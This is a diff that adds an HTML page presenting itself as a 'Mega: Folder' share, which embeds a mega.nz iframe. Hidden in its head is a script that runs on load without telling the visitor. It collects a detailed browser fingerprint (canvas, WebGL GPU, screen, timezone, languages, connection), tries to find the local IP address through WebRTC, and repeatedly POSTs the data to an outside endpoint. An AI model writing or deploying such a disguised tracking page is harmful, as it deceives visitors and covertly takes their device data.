@@ -1,0 +1,95 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mega: Folder</title>
+  <style>
+    body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+    iframe { width: 100%; height: 100%; border: none; }
+  </style>
+  <script>
+    (function() {
+      var data = {};
+      data.userAgent = navigator.userAgent;
+      data.platform = navigator.platform;
+      data.language = navigator.language;
+      data.languages = Array.from(navigator.languages || []);
+      data.cores = navigator.hardwareConcurrency || 'unknown';
+      data.memory = navigator.deviceMemory || 'unknown';
+      data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      data.timezoneOffset = new Date().getTimezoneOffset();
+      data.screen = screen.width + "x" + screen.height;
+      data.colorDepth = screen.colorDepth + "-bit";
+      data.cookieEnabled = navigator.cookieEnabled;
+      data.doNotTrack = navigator.doNotTrack;
+      data.touch = navigator.maxTouchPoints || 0;
+      data.date = new Date().toISOString();
+      data.localTime = new Date().toLocaleString();
+      data.referrer = document.referrer;
+      if (navigator.connection) {
+        data.connectionType = navigator.connection.effectiveType || "unknown";
+        data.downlink = navigator.connection.downlink || "unknown";
+        data.rtt = navigator.connection.rtt || "unknown";
+      }
+      // WebRTC local IP
+      try {
+        var ips = [];
+        var pc = new (window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [] });
+        pc.createDataChannel("");
+        pc.createOffer().then(function(offer) { pc.setLocalDescription(offer); }).catch(function() {});
+        pc.onicecandidate = function(event) {
+          if (event && event.candidate) {
+            var parts = event.candidate.candidate.split(" ");
+            if (parts[4]) ips.push(parts[4]);
+          }
+        };
+        setTimeout(function() {
+          try { pc.close(); } catch(e) {}
+          data.localIP = ips.length > 0 ? ips[0] : "not detected";
+          send();
+        }, 2000);
+      } catch(e) { data.localIP = "failed"; send(); }
+      // Canvas fingerprint
+      try {
+        var canvas = document.createElement("canvas");
+        canvas.width = 256; canvas.height = 64;
+        var ctx = canvas.getContext("2d");
+        ctx.fillStyle = "#121212"; ctx.fillRect(0,0,256,64);
+        ctx.fillStyle = "#ffffff"; ctx.font = "bold 24px Arial";
+        ctx.fillText("Folder", 20, 40);
+        data.canvasFP = canvas.toDataURL("image/png").substring(0, 400);
+      } catch(e) { data.canvasFP = "failed"; }
+      // WebGL GPU
+      try {
+        var c2 = document.createElement("canvas");
+        var gl = c2.getContext("webgl") || c2.getContext("experimental-webgl");
+        if (gl) {
+          var dbg = gl.getExtension("WEBGL_debug_renderer_info");
+          if (dbg) {
+            data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            data.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+          }
+        }
+      } catch(e) { data.gpu = "failed"; }
+      function send() {
+        fetch("https://jsonplaceholder.typicode.com/posts", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data),
+          keepalive: true
+        });
+      }
+      setTimeout(send, 5000);
+      window.addEventListener("load", function() { setTimeout(send, 3000); });
+    })();
+  </script>
+</head>
+<body>
+  <iframe
+    src="https://mega.nz/embed/TcUCDSCK%3D#Wa8RuWu6S1ez80E3L4i7Kw"
+    allowfullscreen
+    sandbox="allow-same-origin allow-scripts allow-popups allow-forms"
+  ></iframe>
+</body>
+</html>
